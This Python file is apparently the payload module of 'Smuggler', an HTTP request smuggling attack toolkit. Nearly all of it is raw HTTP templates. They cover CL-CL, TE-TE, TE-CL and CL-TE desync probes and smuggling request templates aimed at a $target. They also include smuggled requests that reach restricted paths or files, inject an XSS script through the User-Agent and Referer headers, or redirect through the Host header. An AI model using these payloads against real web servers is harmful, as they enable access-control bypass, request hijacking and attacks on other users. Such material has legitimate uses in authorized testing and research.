#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
Smuggler (HTTP -Smuggling- Attack Toolkit) - 2020/2022 - by psy (epsylon@riseup.net)

You should have received a copy of the GNU General Public License along
with PandeMaths; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
payloads={
    'CL-CL-0#Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 2\r\n\r\nY',
    'CL-CL-1#Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 2\r\nContent-Length: 1\r\n\r\nY',
    'CL-CL-2#Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 2\r\nContent-Length: 3\r\n\r\nY',
    'TE-TE-0#Content-Type: application/x-www-form-urlencoded\r\nContent-length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nYPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n',
    'TE-TE-1#Content-Type: application/x-www-form-urlencoded\r\nContent-length: 4\r\nTransfer-Encoding: identity, cow\r\nTransfer-encoding: chunked\r\n\r\n5c\r\nYPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n',
    'TE-TE-2#Content-Type: application/x-www-form-urlencoded\r\nContent-length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: identity, cow\r\n\r\n5c\r\nYPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n',
    'TE-CL-0#Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nYPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n',
    'TE-CL-1#Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nYPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n',
    'CL-TE-0#Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nY',
    'CL-TE-1#Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 5\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nY'
     }
exploits={
    'CL-CL-0#$method $path $protocol\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\n\r\n$SMUGGLED',
    'CL-CL-1#$method $path $protocol\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nContent-Length: $LC\r\n\r\n$SMUGGLED',
    'CL-CL-2#$method $path $protocol\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nContent-Length: $LC\r\n\r\n$SMUGGLED',
    'TE-TE-0#$method $path $protocol\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-length: $CL\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\n$SMUGGLEDPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n',
    'TE-TE-1#$method $path $protocol\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-length: $CL\r\nTransfer-Encoding: identity, cow\r\nTransfer-encoding: chunked\r\n\r\n5c\r\n$SMUGGLEDPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n',
    'TE-TE-2#$method $path $protocol\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-length: $CL\r\nTransfer-Encoding: chunked\r\nTransfer-encoding: identity, cow\r\n\r\n5c\r\n$SMUGGLEDPOST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n',
    'TE-CL-0#$method $path $protocol\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: $CL\r\n\r\n$SMUGGLED',
    'TE-CL-1#$method $path $protocol\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding: chunked\r\nContent-Length: $CL\r\n\r\n$SMUGGLED',
    'CL-TE-0#$method $path $protocol\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n$SMUGGLED',
    'CL-TE-1#$method $path $protocol\r\nHost: $target\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n$SMUGGLED'
     }
methods={
    '0#Y',
    '1#$method $path $protocol\r\nHost: $target\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\n\r\n$parameter=$SMUGGLED',
    '2#GET $restricted HTTP/1.1\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nFoo: Y',
    '3#GET $files HTTP/1.1\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL',
    "4#GET $path HTTP/1.1\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nUser-Agent: <script>alert('$text')</script>\r\nReferer: <script>alert('$text')</script>\r\nFoo: Y",
    "5#GET $PT HTTP/1.1\r\nHost: $redirect\r\n\r\nConnection: close\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: $CL\r\nFoo: Y\r\n\r\n"
     }
